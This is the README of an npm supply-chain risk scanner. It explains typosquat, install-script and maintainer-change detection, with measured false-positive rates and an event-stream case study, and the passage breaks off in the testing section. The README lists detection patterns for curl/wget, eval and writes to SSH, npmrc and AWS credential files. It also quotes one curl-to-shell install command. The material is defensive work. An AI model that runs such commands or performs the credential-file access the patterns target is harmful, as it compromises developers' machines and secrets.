# Supply-Chain Risk Scanner (npm)

A CLI tool that scans a project's `package.json` and flags dependencies that
show signs of supply-chain attack risk. Built to demonstrate dependency-graph
analysis, npm registry API integration, and applied threat modeling — the
kind of work motivated by real incidents like `event-stream`, `ua-parser-js`,
`coa`/`rc`, and `node-ipc`.

Status: **MVP complete — all 5 phases implemented.** See
[Roadmap](#roadmap) below.

## Usage

```bash
node bin/scanner.js scan <path-to-package.json>
node bin/scanner.js scan <path-to-package.json> --json
```

### Web version

The same scan is also available as a small web app — paste or upload a
`package.json`, get back the same risk report the CLI produces, no
install required. `api/scan.js` is a Vercel serverless function that
imports `runScan()` from `src/scan.js` directly (the same function the
CLI calls) — there is exactly one implementation of the detection
pipeline, not a duplicated web version. `public/index.html` is a plain
HTML/CSS/JS single page (no framework, no build step) that POSTs to it.

Run it locally:

```bash
npx vercel dev
```

Differences from the CLI, since this is open on the internet instead of
run by hand:

- **Dependency-count cap (100 per request)** rather than a byte-size
  limit — the actual cost driver is registry calls per dependency, not
  request payload size (real `package.json` files are tiny regardless of
  dependency count).
- **A 25-second internal timeout**, independent of the platform's own
  function timeout, so a slow npm/GitHub response gets the client a clean
  JSON error instead of a raw platform timeout. Note: this stops the
  client from *waiting* on the in-flight registry requests, it doesn't
  abort them server-side (no `AbortController` threaded through
  `registryClient`/`githubReleaseCheck` — out of scope for this pass).
- **Rate limiting — implemented, but confirmed weaker than it looks.**
  An in-memory per-IP counter is checked before every scan. Testing it
  locally via `vercel dev` showed it provides **zero actual protection**
  there: each invocation runs as an isolated process with fresh module
  state, so the counter never accumulates between requests — verified by
  temporarily logging the tracked count, which read `1` on every one of
  several rapid sequential requests. In real production it may do a
  little better on a single warm instance handling consecutive requests,
  but Vercel Functions scale to multiple concurrent instances with
  independent memory, so it's still not a real distributed limit. A
  deployment expecting genuine public traffic should replace this with
  Vercel KV or Upstash Redis. The dependency-count cap and timeout above
  are the safeguards that actually hold regardless of instance/process
  state.
- **No internal error details reach the client.** Every failure path
  returns a small `{ "error": "..." }` JSON object; full detail (stack
  traces, the raw manifest that failed to parse, etc.) goes to the
  platform's server-side logs only via `console.error`. Caught one real
  instance of this leaking during testing: `req.body` on Vercel's Node
  runtime is a lazy getter that throws synchronously on invalid JSON, and
  that access wasn't in the initial try/catch — it silently crashed the
  whole invocation, returning the platform's generic
  `FUNCTION_INVOCATION_FAILED` instead of the intended clean 400. Fixed
  by wrapping that specific access.

**Verified locally (`vercel dev`), not just assumed working:** POSTing
the real `test-fixtures/express-package.json` (44 dependencies) to
`/api/scan` and running `node bin/scanner.js scan
./test-fixtures/express-package.json --json` for the same file produced
**byte-for-byte identical output** (diffed programmatically, not
eyeballed). The frontend was exercised in a real browser with the
event-stream fixture and correctly rendered it as High with the right
signals. Every error path (malformed JSON, wrong HTTP method, array
instead of object, unknown package, over the dependency cap) was tested
against the running dev server, not just reasoned about — this is how
the `req.body` bug above was actually found.

## Example: a real end-to-end scan

`test-fixtures/version-anomaly-example-package.json` pins
`event-stream@3.3.5` — the actual version from the real 2018 incident (see
"Phase 4 — Maintainer & version anomalies" below) — alongside two
healthy packages. This is the real, unedited output of:

```bash
node bin/scanner.js scan ./test-fixtures/version-anomaly-example-package.json
```

```
Scanning 3 direct dependencies in ./test-fixtures/version-anomaly-example-package.json...
(checking typosquats, install scripts, and version/maintainer history via the npm registry)

┌────────────────────────────┬────────────────┬──────────────┬──────────┬────────────────────────────────────────────────────────────┐
│ Package                    │ Version Range  │ Type         │ Score    │ Signals                                                    │
├────────────────────────────┼────────────────┼──────────────┼──────────┼────────────────────────────────────────────────────────────┤
│ event-stream               │ 3.3.5          │ dependency   │ High     │ dormant 780d then published (prev 3.3.4)                   │
│                            │                │              │          │ maintainers changed (+right9ctrl)                          │
├────────────────────────────┼────────────────┼──────────────┼──────────┼────────────────────────────────────────────────────────────┤
│ commander                  │ ^12.1.0        │ dependency   │ Low      │ -                                                          │
├────────────────────────────┼────────────────┼──────────────┼──────────┼────────────────────────────────────────────────────────────┤
│ debug                      │ ^4.3.7         │ dependency   │ Low      │ -                                                          │
└────────────────────────────┴────────────────┴──────────────┴──────────┴────────────────────────────────────────────────────────────┘

Risk summary: 1 High, 0 Medium, 2 Low (of 3 direct dependencies). This is a heuristic report — review flagged packages yourself, don't treat any score as proof.
```

(In an actual terminal, `Score` is color-coded — green/yellow/red — via
`chalk`; colors are auto-disabled here since this is piped to a file.)

The same scan with `--json` (truncated to the first entry — the real
output includes the full detail for every dependency, including raw
install-script text and the complete version-anomaly breakdown):

```bash
node bin/scanner.js scan ./test-fixtures/version-anomaly-example-package.json --json
```

```json
[
  {
    "name": "event-stream",
    "versionRange": "3.3.5",
    "type": "dependency",
    "resolvedVersion": "3.3.5",
    "typosquat": null,
    "installScript": { "status": "ok", "lifecycleScripts": {}, "flags": {}, "...": "..." },
    "versionAnomaly": {
      "status": "ok",
      "dormancy": {
        "previousVersion": "3.3.4",
        "previousPublishedAt": "2016-07-17T07:24:09.767Z",
        "publishedAt": "2018-09-05T05:27:47.219Z",
        "gapDays": 780
      },
      "majorJump": null,
      "maintainerChange": { "previousVersion": "3.3.4", "added": ["right9ctrl"], "removed": [] },
      "github": { "checked": false, "reason": "not attempted (no major-version jump flagged)" }
    },
    "signals": ["dormancy", "maintainerChange"],
    "score": "High"
  }
]
```

**At larger scale** — scanning the real `express` dependency tree
(`test-fixtures/express-package.json`, 44 packages) — produced **8 High,
0 Medium, 36 Low**. That's the Definition-of-Done real-project test this
brief asked for, and it's also the result that surfaced this tool's most
important limitation — see "What 'High' actually means" under Phase 5
below before trusting a High score as more than "worth a look."

## Detection logic

### Phase 1 — Dependency listing

Parses `dependencies` and `devDependencies` out of the given `package.json`
and prints them as a table (name, declared version range, type). Transitive
dependencies are out of scope for the MVP.

### Phase 2 — Typosquat detection

For each direct dependency, the scanner checks whether its name is an exact
match in a bundled snapshot of the top 1000 npm packages by popularity. If
not, it computes the Levenshtein (edit) distance against every name in that
list and flags the dependency if the closest match is within a threshold —
on the theory that `reqeusts` sitting a couple of keystrokes from `requests`
is a classic typosquat signature.

**Data source:** `data/top-1000-packages.json` is a static, point-in-time
snapshot (see `snapshotDate` in the file) sourced from
[tristan-f-r/npm-rank](https://github.com/tristan-f-r/npm-rank), an
automated GitHub Actions job that ranks npm packages by popularity. It is
**not** fetched live — popularity rankings drift slowly, and a static
snapshot keeps the scanner fast, offline-capable, and reproducible. Rebuild
it periodically (see `data/top-1000-packages.json`'s `source` field) to stay
current; a stale snapshot mainly risks missing newly-popular packages, not
false negatives on established ones.

**Why not a flat "distance ≤ 2" threshold:** the brief's starting point was
edit distance ≤ 2 against the full list. Before locking that in, I measured
its false-positive rate against two sets of *legitimate* packages:

1. All 44 dependencies of a real `express` `package.json` not already in the
   top-1000 snapshot (11 non-exact names).
2. The *next* 500 most-popular npm packages (ranks 1001–1500) — real,
   legitimate, popular packages that just happen to sit outside the top-1000
   snapshot, used as a stand-in for "plausible direct dependencies that
   aren't typosquats."

At a flat distance ≤ 2, set (2) had a **9.8% false-positive rate** (49/500),
almost entirely on short names where a distance of 2 covers a large fraction
of the string — e.g. `util` flagged as a possible typo of `uuid`, `moo` of
`meow`, `temp` of `pump`. Edit distance is a poor signal on short strings:
there just aren't enough characters for "far away" to mean anything.

The fix implemented in `src/typosquat.js`: **scale the allowed distance by
the length of the shorter name being compared**, instead of a flat cutoff:

| shorter name length | max allowed distance |
|---|---|
| < 4 chars | 0 (exact match only — never flagged) |
| 4–5 chars | 1 |
| ≥ 6 chars | 2 |

Re-measured with this scaling:
- Set (2) false-positive rate dropped to **4.8%** (24/500).
- A hand-built set of 25 typosquat-style names (`lodahs`, `expres`,
  `chalkk`, `cross-env-`, `axioss`, `commanderr`, etc.) still caught
  **19/25 (76%)**.

**Trade-off, explicitly:** this is a heuristic, not proof. The remaining
false positives in set (2) are mostly *genuinely* close, unrelated package
names (`synckit`/`asynckit`, `xlsx`/`clsx`, `simple-get`/`simple-git`) —
tightening further to kill those would also kill true positives, since
typosquats are specifically designed to look like these near-misses. The
tool surfaces "possible typo of X (distance N)" as a signal for a human to
review, not an automatic verdict — flagged packages are not blocked or
scored as malicious on this signal alone (that combination happens in
Phase 5).

**Known limitation:** standard Levenshtein distance counts a single
character transposition (e.g. `axois` vs `axios`) as distance 2, not 1, so
some real-world typo patterns are under-counted. Damerau-Levenshtein (which
treats adjacent transpositions as a single edit) would catch more of these
— noted as a future improvement rather than implemented now, to stay within
the brief's suggested `fast-levenshtein` dependency.

### Phase 3 — Install script red flags

For each direct dependency, the scanner fetches the package's full metadata
document from the npm registry (`https://registry.npmjs.org/<name>`),
resolves which published version the declared range would actually install,
and inspects that version's `preinstall`/`install`/`postinstall` scripts for
patterns associated with malicious behavior: a bare `curl`/`wget`/
`Invoke-WebRequest` call, `eval(`, `child_process` usage, or a write target
under a sensitive path (`~/.ssh/`, `.npmrc`, `~/.aws/credentials`, shell
profile files).

**Version resolution:** without a lockfile, the scanner doesn't know the
exact version npm would install — it resolves the declared range
(`^6.0.0`, etc.) against the registry's list of published versions using
`semver.maxSatisfying`, and falls back to the `latest` dist-tag
(marked "approximated" in output) when the range doesn't resolve, e.g. a
git URL or workspace protocol.

**Deliberate scope limit:** this only inspects the script *command string*
in `package.json` — it does not fetch and analyze files that string
invokes (e.g. what `node scripts/install.js` actually does). That's a much
larger static-analysis problem. This matters for the false-positive
measurement below: it's *exactly* why native-module packages test clean —
their install step is almost always "run a local script," and the
interesting logic (if any) lives inside a file this scanner doesn't open.

**False-positive measurement — two passes, two different populations:**

*Pass 1 (initial, narrow):* I first pulled real registry metadata for
packages known to use install scripts for legitimate reasons — the ones
named in the brief (`node-sass`, `bcrypt`, `sharp`) plus 20 more hand-picked
real packages (`puppeteer`, `canvas`, `sqlite3`, `fsevents`, `esbuild`,
`argon2`, `keytar`, `node-pty`, `leveldown`, etc. — full list in
`test-fixtures/legit-install-scripts.json`). Result: 0/23 flagged. This is
a real measurement, but a weak one — the sample was chosen specifically
*because* these are well-known-legitimate packages, so a 0% rate mostly
proves the pattern list doesn't break the packages I already knew were
clean. It doesn't estimate a false-positive rate on packages in general.

*Pass 2 (broader, unbiased-within-population):* to get an actual rate, I
needed a sample not selected by "packages I already trust." A pure random
sample doesn't work here — pulling 10,000 packages at random from the top
10,000 by npm popularity and checking their scripts found only **5**
with any `preinstall`/`install`/`postinstall` at all (a 0.05% incidence
rate), nowhere near enough to benchmark against. Instead I searched the
npm registry (`registry.npmjs.org/-/v1/search`) across 20 generic technical
terms tied to native-build/install patterns — `node-gyp`, `prebuild`,
`napi`, `bindings`, `postinstall`, `husky`, `opencollective`, `ffi`, `nan`,
etc. (full query list in `test-fixtures/install-script-search-sample.json`)
— which surfaced 4,675 unique candidate packages, of which **578** actually
had a real lifecycle script when checked live against the registry. That
578-package set is the false-positive benchmark.

**Result: 4/578 flagged (0.69%).** I reviewed all four by hand:

| package | flagged for | verdict |
|---|---|---|
| `@lavamoat/preinstall-always-fail` | `.npmrc` (suspicious write target) | **false positive** — its script is a warning message *telling the user* to configure `.npmrc`, not writing to it |
| `ytdlp-nodejs` | `child_process` | **false positive** — uses `child_process.execSync` to run its own `npm run postdownload` script, a normal (if unusually-written) local invocation |
| `projkit` | `child_process` | **false positive** — uses `child_process.execSync` to run its own bundled CLI and `chmod` a git hook file |
| `safe-postinstall-test` | `curl` (network fetch) | **not a false positive** — its script is literally `node postinstall.js && curl https://example.com/ \| sh`, the exact curl-to-shell pattern this check exists to catch, despite the reassuring package name |

So the *true* false-positive rate is closer to **3/578 (0.52%)** — the
regression test (below) locks in the conservative, literal 4/578 bound
from the automated count, since that's what the code reproducibly
measures; the manual triage is judgment calls layered on top. The two real
false positives share a root cause: `child_process` is flagged as a
category regardless of *what* it invokes, and both are invoking the
package's own bundled code, not spawning something external. A more
precise check would distinguish "child_process running a path inside the
package" from "child_process running a downloaded/external command" —
noted under [What I'd add with more time](#what-id-add-with-more-time).

**What population this is — and isn't:** "packages found via npm registry
search for native-build/install-related terms, that turned out to have a
real lifecycle script" is a real, broad, non-hand-picked population — but
it is not the same as "a random sample of all packages with install
scripts" (that population is too rare to sample directly, see above) and
it is not the original 23 famous packages. Read the 0.69%/0.52% figures as
specific to this search-defined population, not a universal false-positive
rate for the internet's npm packages.

**True-positive check:** synthetic scripts modeled on documented
supply-chain attack techniques — `curl ... | bash`, `wget` + `chmod +x` +
execute, `child_process.exec` wrapping a download, `eval` of a
base64-decoded payload, SSH-key exfiltration via a sensitive write path —
all correctly flagged (see `src/installScriptCheck.test.js`). These are
reconstructed from known technique categories, not copied from any real
malicious package.

**Caching:** `src/registryClient.js` caches each package's full metadata
document in memory, keyed by package name (not name+version — the registry
has no cheaper per-version endpoint, the whole-package document covers
every version in one request, and a package can appear under different
declared ranges in `dependencies` vs `devDependencies`, so keying by
name+version would cause *extra* duplicate fetches rather than fewer). This
saves a redundant network call within a single scan when a package name
repeats, and Phase 4's version-history/maintainer checks will reuse the
same cached document. It's in-memory only — cleared when the process exits
— so it does **not** save a network round trip across separate `scanner
scan` invocations; a persistent (e.g. file-based) cache is listed under
[What I'd add with more time](#what-id-add-with-more-time).

**Stack deviation:** used Node's built-in `fetch` instead of the brief's
suggested `axios`/`node-fetch` — Node 22 ships a native `fetch`, so an HTTP
client dependency adds nothing here. Also added `semver` (not in the
brief's suggested stack) for version-range resolution — needed to check the
version that would actually be installed rather than guessing.

### Phase 4 — Maintainer & version anomalies

For each dependency's resolved version, the scanner reuses the same cached
registry metadata document Phase 3 already fetched (`registryClient`'s
in-memory cache, keyed by package name — no new fetch path added) and
checks its publish history (`time`) and per-version `maintainers` list for
three things:

1. **Dormancy then publish** — the resolved version was published more
   than `DORMANCY_DAYS` after whichever version came immediately before it
   in *actual publish-time order* (not semver order).
2. **Large major-version jump** — the resolved version's major number
   jumps by 2 or more compared to the immediately preceding published
   version (e.g. `2.x` straight to `4.x`). A routine single major bump
   isn't flagged — see the measurement below for why. When this fires, the
   scanner makes a best-effort check for a matching GitHub release (see
   below).
3. **Maintainer/owner change** — the recorded `maintainers` list differs
   between the resolved version and its immediate predecessor. Verified
   against real registry data that this field is a genuine point-in-time
   snapshot, not retroactively rewritten (an old version's `maintainers`
   still shows the maintainer's old email address, for example) — so this
   reflects who actually had publish access at each release. `_npmUser`
   (who personally ran `npm publish` for one version) was considered and
   rejected as the primary signal: on a healthy multi-maintainer project,
   different people publish different releases constantly without it
   meaning anything changed.

**GitHub release check (enrichment on #2 only):** when a major-jump is
flagged, the scanner tries the package's `repository` URL against GitHub's
release API, guessing a few common tag formats (`v2.0.0`, `2.0.0`,
`pkgname@2.0.0`). This is scoped to major-jump specifically — not a
universal check — for two reasons: it's literally what the brief asks
("no corresponding GitHub release/changelog" is framed as a property *of*
a large jump), and unauthenticated GitHub API access is capped at
**60 requests/hour**, which wouldn't survive a scan of a real dependency
tree if every package triggered a call. The moment one call comes back
rate-limited, the scanner stops trying for the rest of that scan run
rather than burning through guaranteed-to-fail requests. Tag-guessing is
inherently incomplete (real repos use all sorts of conventions), so "no
matching release found" is presented as weak evidence, not proof.

**Real-world validation — the event-stream incident:** rather than only
testing against synthetic examples, I validated against the actual 2018
`event-stream` maintainer-hijack (live registry data, later saved as a
static fixture — see Testing below):

- `3.3.4` → `3.3.5`: a **780-day** gap (over 2 years of silence), and
  `right9ctrl` — the account that would go on to publish the backdoored
  `3.3.6` days later — added as a maintainer at that exact version.
- `3.3.5` → `4.0.0`: `dominictarr`, the original author, removed from the
  maintainers list shortly after.

The scanner catches both signals at exactly the versions where they
happened, using nothing but the registry's own historical data — no
special-casing for this package.

**False-positive measurement — same standard as Phase 3, precise about the
population:** 300 packages randomly sampled (fixed seed 42) from
npm's top 10000 by popularity — with a data-quality catch: that ranking
dataset itself contains only **5,247 truly unique names among its 10,000
entries** (250 names repeat, one as many as 21 times — an upstream
scraping artifact, not something I introduced), so the 300-item draw
de-duplicated down to **270 unique real packages**. That's the honest
sample size reported below and locked into the regression test — see
`test-fixtures/version-anomaly-sample.json` for the full caveat in its own
words.

| dormancy threshold | flagged (of 270) |
|---|---|
| 180 days | 31.1% |
| 270 days | 26.3% |
| **365 days (brief's suggestion)** | **18.5%** |
| 450 days | 15.2% |
| **545 days (chosen)** | **13.0%** |
| 730 days | 8.5% |

| major-jump threshold | flagged (of 270) |
|---|---|
| **≥ 1 (routine bump)** | **18.1%** |
| **≥ 2 (chosen)** | **1.5%** |
| ≥ 3 | 0.4% |
| ≥ 4 | 0.4% |

**Why 545 days, not the brief's 365:** dormancy-then-publish is not a rare
event in the general npm ecosystem — plenty of small, "done" utility
packages go quiet for over a year and then get a routine maintenance
release, which isn't inherently suspicious. At 365 days, nearly 1 in 5
random popular packages would be flagged; that's too noisy to call
"anomalous" with a straight face. 545 days (~18 months) cuts that to 13%
while still leaving a **235-day margin** under event-stream's real
780-day gap — comfortable enough that the real incident isn't sitting
right at the edge of the threshold.

**Why ≥ 2 for major jumps:** a routine single major bump (`1.x` → `2.x`)
flagged 18.1% of the sample — exactly as expected, since that's normal
semver practice, which is why it was excluded by design from the start
rather than discovered as a problem. Requiring a skip of at least one
major version (`≥ 2`) drops that to 1.5% (4 packages), and I checked all
four by hand: three are `@types/*` packages (`@types/d3`, `@types/d3-color`,
`@types/react-redux`), which track their underlying library's own major
version rather than semver-ing independently — a known, systematic,
explainable pattern, not noise. The fourth, `os-locale` (`6.0.2` → `8.0.0`
after a 1504-day gap), is a genuine case where two signals coincide —
exactly the kind of package this tool should surface for a human to look
at, not a false positive.

**Maintainer-change incidence (6.3%, 17/270) — deliberately not tuned to a
threshold**, since it's a binary "did the list change" check, not a
numeric cutoff. The real examples in the sample make the point that this
signal alone isn't a verdict: `object-assign` added `gaearon` (Dan
Abramov, a well-known maintainer — an unremarkable hand-off), while
`imagemin` removed five maintainers at once (`nothingismagick`, `kevva`,
`1000ch`, `xhmikosr`, `shinnn` — a large team reorganization, still not
inherently malicious). Both look identical to the detector; distinguishing
"routine hand-off" from "hostile takeover" needs more context than a
maintainer-list diff alone provides — exactly why Phase 5's scoring
combines signals instead of treating any one of them as a standalone
verdict.

**Two real bugs found and fixed during this measurement** (both covered by
new tests):

1. **Nightly/prerelease versions corrupting the major-jump comparison.**
   Some packages publish to a separate prerelease channel with its own
   version scheme (e.g. `0.0.0-nightly-next-20260902.0`) interleaved in
   publish-time history with stable releases. The first measurement pass
   read one of these as "the previous version" and reported a 48-major
   jump for a routine `47.x` → `48.x` release. Fixed in
   `src/versionAnomalyCheck.js` by excluding prerelease versions (anything
   with a semver `-tag`) from the dormancy/major-jump comparison baseline —
   maintainer-change checks are left unfiltered, since who can publish is
   meaningful regardless of channel.
2. **`resolveVersion` didn't match real npm behavior.** It called
   `semver.maxSatisfying` with `{ includePrerelease: true }`, which allows
   a plain range like `^1.0.0` to resolve to a prerelease version
   (`1.5.0-beta.1`) — something a real `npm install` never does by
   default. Fixed in `src/registryClient.js` by dropping that option. This
   affects Phase 3's install-script check too (it uses the same resolved
   version), not just Phase 4.

### Phase 5 — Scoring & report

Combines the signals from Phases 2-4 into one Low/Medium/High score per
package (`src/riskScore.js`), and renders either a colored `cli-table3`
report or, with `--json`, the full per-package detail as machine-readable
JSON — the brief's stretch goal, promoted to MVP scope here.

**The rule the brief specifically asked for:** dormancy must never, by
itself, produce a High score. More generally, *no single signal* — however
severe it sounds — reaches High alone. There are five distinct signal
types: `typosquat`, `installScript`, `dormancy`, `majorJump`,
`maintainerChange`. Two of them (`typosquat`, `installScript`) are treated
as strong enough to reach **Medium** alone; the other three are
individually common and explainable in legitimate packages — measured at
13.0%, 1.5%, and 6.3% base rates respectively in Phase 4's real sample —
so they're capped at **Low** alone. **High requires 2 or more distinct
signal types aligning on the same package**, regardless of which two.

**Why "2 or more," not "exactly 3 like the brief's event-stream example":**
I measured how often 2+ of the three version-anomaly signals actually
co-occur in Phase 4's real 270-package sample before picking this rule —
same discipline as every other threshold in this project:

| signals aligned | packages (of 270) |
|---|---|
| dormancy only | 35 (13.0%) |
| major jump only | 4 (1.5%) |
| maintainer change only | 17 (6.3%) |
| **2 or more of the three** | **5 (1.9%)** |
| **all three** | **1 (0.4%)** |

1.9% is rare enough to be a meaningful "look at this" trigger without
being noisy, and — importantly — using the real event-stream 3.3.5 data
(dormancy + maintainerChange, 2 signals; it doesn't cross a major version
at that exact release) already reaches High under this rule, so the
true-positive test below runs against the actual incident, not a
synthetic stand-in for it.

I reviewed all 5 real "2+ signal" cases from the sample by hand — none
look like attacks, which is expected in a random sample of already-popular
packages, and is exactly the point of a heuristic tool: surface for human
judgment, don't auto-convict.

| package | signals | what it actually was |
|---|---|---|
| `camelize` | dormancy + maintainer change | added `ljharb` — a well-known maintainer who adopts many small abandoned packages |
| `detective` | dormancy + maintainer change | `dominictarr` removed, 3 new maintainers added — a team hand-off |
| `hawk` | dormancy + maintainer change | maintainer team fully replaced — hand-off to the hapi.js org |
| `undertaker-registry` | dormancy + maintainer change | added `yocontra`, a known gulp/undertaker ecosystem maintainer |
| `os-locale` | **all three** (dormancy + major jump + maintainer change) | `6.0.2` → `8.0.0` after 1504 days quiet — the one real match for the brief's full event-stream-pattern example |

#### What "High" actually means (the express result, examined honestly)

**Running this against a real, large dependency tree (express, 44
packages)** produced **8 High, 0 Medium, 36 Low**. Before calling this
phase done, I pulled the exact signals for all 8, rather than eyeballing
the table — every single one is the identical pair, `dormancy +
maintainerChange` (added), and every one is a known-benign hand-off:

| package | dormancy gap | maintainer change |
|---|---|---|
| `accepts` | 941d | `+wesleytodd` |
| `statuses` | 1616d | `+ulisesgascon`, `+blakeembrey` |
| `encodeurl` | 2258d | `+blakeembrey` |
| `http-errors` | 1434d | `+ulisesgascon` |
| `range-parser` | 2603d | `+ulisesgascon`, `+blakeembrey` |
| `after` | 1143d | `+defunctzombie`, `−shtylman` |
| `morgan` | 1945d | `+ulisesgascon` |
| `cookie-parser` | 1057d | `+ulisesgascon` |

Zero of the 8 involve `typosquat` or `installScript` — a real check I ran
specifically to rule out the failure mode where a lower-confidence signal
(like a borderline typosquat match) stacks with an unrelated
version-anomaly flag to inflate a score. That's not what's happening
here.

What *is* happening is more fundamental: **dormancy and maintainerChange
aren't two independent signals corroborating each other — they're two
views of one event.** A new maintainer is usually *why* a dormant package
suddenly ships again, so the pair isn't "two unlikely things coincided,"
it's "one thing happened, and it produced two flags." And critically: I
checked whether event-stream's real malicious version differs structurally
from these 8, and **it doesn't** — at `3.3.5`, the exact version that
shipped days before the backdoor, event-stream shows only `dormancy +
maintainer added`, the same shape as every row above. `dominictarr` wasn't
removed until `4.0.0`, a later, separate version — so even that stronger
tell (an existing maintainer being pushed out) wasn't present at the
version that actually mattered. At the level of data available from the
registry, a trusted engineer reviving a stable utility and an attacker
account getting added right before a backdoor ship are the same shape.
That's a reputation/identity gap, not a threshold to tune away — no
rule change within the current signal set can keep event-stream's real
attack version at High while excluding these 8, because the data doesn't
distinguish them.

Given that, **High is left defined as "2+ independent signal types
landed on the same package," not "likely malicious."** On a real,
well-audited dependency tree, most High results will be legitimate
maintenance events, not attacks — that's an accepted, explicit trade-off:
missing a real hijack is worse than one extra High label a human
dismisses in two minutes after seeing a recognizable name. The CLI's
summary line says this plainly (see `src/report.js`'s `renderSummary`)
rather than leaving "High" to imply more confidence than the tool
actually has.

**`--json`:** `scanner scan <path> --json` prints the full result array
(one object per dependency, including every raw sub-result — typosquat
match, install-script flags and raw script text, version-anomaly detail,
computed `signals` and `score`) as JSON to stdout, with no other output —
safe to pipe into `jq` or another tool.

**Stack:** used the brief's suggested `cli-table3` and `chalk` here — no
deviation this time, since Phase 5 is specifically where the brief calls
for them and `console.table` (used through Phase 1-4) doesn't support
color or wrapped multi-line cells, which the Signals column needs.

## Testing

Automated tests (Vitest) live in `src/typosquat.test.js`,
`src/installScriptCheck.test.js`, `src/registryClient.test.js`,
`src/versionAnomalyCheck.test.js`, `src/githubReleaseCheck.test.js`, and
`src/riskScore.test.js`. Run them with:

```bash
npm test
```

Chosen over Jest for zero-config ESM support — this project uses native
`"type": "module"`, which Jest needs extra transform config for.

What's covered:

- **Threshold-logic unit tests** — `maxAllowedDistance()` is tested directly
  against each length bucket (< 4, 4–5, ≥ 6 chars), and `checkTyposquat()` is
  exercised against a small controlled popular-name list to pin down exact
  boundary behavior (e.g. a name at exactly the allowed distance flags; one
  edit further doesn't), independent of the live snapshot's contents.
- **True positives** — a fixed set of typosquat-style names (`lodahs`,
  `expres`, `axioss`, `commanderr`, etc.), including two picked to sit
  exactly on the boundary of their length bucket, asserted against the real
  bundled snapshot with exact expected `closestMatch`/`distance`.
- **True negatives** — exact matches to popular packages, the short-name
  false positives from the original flat-threshold measurement (`util`,
  `temp`, `moo`, etc. — must stay unflagged), a past-boundary case, and a
  dedicated check that the real `express` fixture produces zero flags.
- **Documented limitations** — a fixed set of names the current algorithm is
  known to miss (`axois`, `chlak`, `electorn`, …, all transposition- or
  length-bucket-driven), asserted as *currently* unflagged so a future
  algorithm change surfaces here deliberately rather than silently.
- **False-positive regression** — replays the Phase 2 measurement (all 500
  packages ranked 1001–1500, `test-fixtures/popular-packages-1001-1500.json`)
  and asserts the flag count stays at or below 24/500 (4.8%), so a future
  change to the threshold logic can't silently regress false-positive rate.

Also covered for Phase 3 (`src/installScriptCheck.test.js` /
`src/registryClient.test.js`):

- **Pattern-matching unit tests** — each red-flag category (network fetch,
  eval, child_process, suspicious write target) tested directly against
  synthetic strings, plus negative checks (a substring like "retrieval"
  shouldn't trip the `eval` pattern; a plain `node install.js` shouldn't
  trip anything).
- **True positives** — the five synthetic attack-technique scripts described
  above, each asserted to produce the expected category.
- **True negatives (named spot-check)** — every one of the 23 hand-picked
  real legitimate scripts in `test-fixtures/legit-install-scripts.json`
  asserted individually (via `it.each`) to produce zero flags — readable,
  specific regression cases, not the false-positive rate claim.
- **False-positive rate regression (unbiased sample)** — the 578-package
  registry-search sample (`test-fixtures/install-script-search-sample.json`)
  asserted to produce at most 4 flags, locking in the measured 0.69% rate
  so a future change to the pattern list can't silently make it worse.
- **Registry client** — `fetchPackageMetadata` tested with a mocked `fetch`
  (no live network in the suite): asserts repeated calls for the same
  package hit the network once, different packages each get their own
  fetch, concurrent in-flight requests for the same package collapse into
  one call, and a 404 resolves to `null` rather than throwing.
  `resolveVersion` tested against fake metadata for range resolution and the
  latest-tag fallback.

Fixtures:

- `test-fixtures/express-package.json` — a real, fetched `express` manifest
  (44 dependencies) used as a false-positive check.
- `test-fixtures/typosquat-example-package.json` — a synthetic manifest with
  deliberately misspelled package names, used as a true-positive check
  (exercised manually via the CLI; see Phase 2 commit for sample output).
- `test-fixtures/popular-packages-1001-1500.json` — the 500-package
  false-positive benchmark sample for typosquat detection.
- `test-fixtures/legit-install-scripts.json` — 23 hand-picked real
  packages' install scripts (a named spot-check, not the FP-rate sample).
- `test-fixtures/install-script-search-sample.json` — the 578-package
  unbiased registry-search sample backing the actual false-positive rate
  measurement above.
- `test-fixtures/install-script-example-package.json` — a manifest mixing
  real native-build packages with a nonexistent package name, used to
  manually exercise the "not found on registry" path via the CLI.

Also covered for Phase 4 (`src/versionAnomalyCheck.test.js` /
`src/githubReleaseCheck.test.js`):

- **Unit tests on the core logic** — `getVersionHistory` (chronological
  sort, excluding `created`/`modified`/`unpublished`), `checkDormancy`,
  `checkMajorJump` (including the prerelease-filtering fix, tested directly
  against a synthetic nightly-build scenario), and `checkMaintainerChange`
  (added/removed maintainers, first-release-has-no-predecessor edge case).
- **Real-world true positive** — the event-stream 2018 incident, replayed
  against a static, trimmed snapshot of its actual registry metadata
  (`test-fixtures/event-stream-metadata-snapshot.json`, offline — no live
  fetch in the test): asserts the exact 780-day dormancy gap, `right9ctrl`
  being added as maintainer at 3.3.5, and `dominictarr` being removed by
  4.0.0.
- **False-positive rate regression (unbiased sample)** — the 270-package
  sample (`test-fixtures/version-anomaly-sample.json`) asserted to produce
  at most 35 dormancy flags (13.0%) and at most 4 major-jump flags (1.5%)
  at the chosen thresholds, and at most 17 maintainer-change flags (6.3%,
  informational).
- **GitHub release check** — `parseGithubRepo` tested against `git+https`,
  plain `https`, object-form, and `ssh`-style repository fields;
  `checkGithubRelease` tested with a mocked `fetch`: finds a release on the
  first matching tag format, falls through multiple tag formats before
  giving up, reports `found: false` cleanly when none match, and — the
  important one given the 60/hour rate limit — stops after exactly one
  call (not three) the moment a 403 comes back, rather than burning through
  the rest of the tag attempts.

Fixtures:

- `test-fixtures/version-anomaly-example-package.json` — pins
  `event-stream@3.3.5` (the real incident version) alongside healthy
  packages, for manually exercising the CLI end-to-end.
- `test-fixtures/event-stream-metadata-snapshot.json` — trimmed static
  snapshot of event-stream's real registry metadata, backing the
  true-positive tests above.
- `test-fixtures/version-anomaly-sample.json` — the 270-package unbiased
  sample backing the false-positive rate measurement above (see its
  `description` field for the full duplicate-dataset caveat).

Also covered for Phase 5 (`src/riskScore.test.js`):

- **Unit tests on the scoring rule** — every signal alone (weak → Low,
  strong → Medium, never High), every 2-signal combination (weak+weak,
  strong+strong) scoring High, the illustrative 3-signal case, duplicate
  signals not over-counting, and an unrecognized signal name throwing
  rather than silently miscounting.
- **`deriveSignals` unit tests** — extracting the right signal list from
  clean / typosquat / install-script / all-three-version-anomaly results,
  and confirming non-`"ok"` statuses (not-found, error, unresolved) are
  informational and don't contribute signals.
- **Real-world true positive** — the full pipeline run on event-stream's
  actual 3.3.5 data (offline, via the same static snapshot as Phase 4's
  tests) produces exactly `["dormancy", "maintainerChange"]` and scores
  **High** — from real incident data, not a constructed example.
- **Real-world check that dormancy alone doesn't reach High** — rather
  than constructing a synthetic case, this test searches Phase 4's real
